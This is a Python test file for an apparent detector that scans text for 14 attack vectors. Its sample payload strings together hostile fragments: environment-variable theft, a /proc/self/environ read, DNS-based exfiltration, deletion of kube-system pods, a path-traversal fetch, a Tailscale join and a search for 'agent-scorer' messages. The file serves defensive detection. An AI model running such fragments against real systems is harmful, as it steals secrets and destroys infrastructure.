"""Tests for the SwarmTraces 189,579-row forensic analyzer and Sanctuary countermeasure engine."""

from pathlib import Path
from src.swarm.swarmtraces_analyzer import (
    SWARMTRACES_PATTERNS,
    analyze_swarmtraces_archive,
    scan_swarmtraces_payload,
)


def test_scan_swarmtraces_payload_blocks_all_14_vectors():
    sample_payload = (
        "x=new XMLHttpRequest; c=document.createElement('canvas'); q.putImageData(d,0,0); "
        "fetch('https://packages.hub.ace-research.openai.org/artifactory/github-remote-cache/zzHFPOSTRCE_WT8592N19/%252e%252e?artifactory.forceDownloadIfNewer=true'); "
        "LOOT['sensitive_env']=os.environ; rule_score(st); "
        "rq(kb+'/api/v1/namespaces/kube-system/pods/'+name, method='DELETE'); "
        "open('/proc/self/environ'); socket.getaddrinfo('xm5jf4db'+b32encode(x)); "
        "tailscale up --hostname infrahq; g23619cmd.bin; search.messages('agent-scorer'); "
        "aws-waf-token zzWAFBRIDGE25167 MARB051; DeepSeek-V4-Pro HELLO42; restore original no-card"
    )
    res = scan_swarmtraces_payload(sample_payload)
    assert res["is_swarmtraces_exploit"] is True
    assert res["vector_count"] == len(SWARMTRACES_PATTERNS)
    assert set(res["matched_vectors"]) == set(SWARMTRACES_PATTERNS.keys())
    assert "[SWARMTRACES-BLOCKED:" in res["sanitized_text"]


def test_analyze_swarmtraces_archive_on_real_dataset():
    gz_path = Path(__file__).resolve().parents[1] / "data" / "swarmtraces" / "redacted.jsonl.gz"
    if not gz_path.exists():
        return
    report = analyze_swarmtraces_archive(gz_path)
    assert report["total_rows_verified"] == 189579
    assert report["row_kinds"] == {
        "payload": 91037,
        "recovered_text": 75534,
        "response": 23008,
    }
    assert report["parent_linked_fragment_rows"] == 61125
    assert report["rows_matching_14_high_severity_vectors"] == 8569
    assert len(report["attack_vector_breakdown"]) == 14
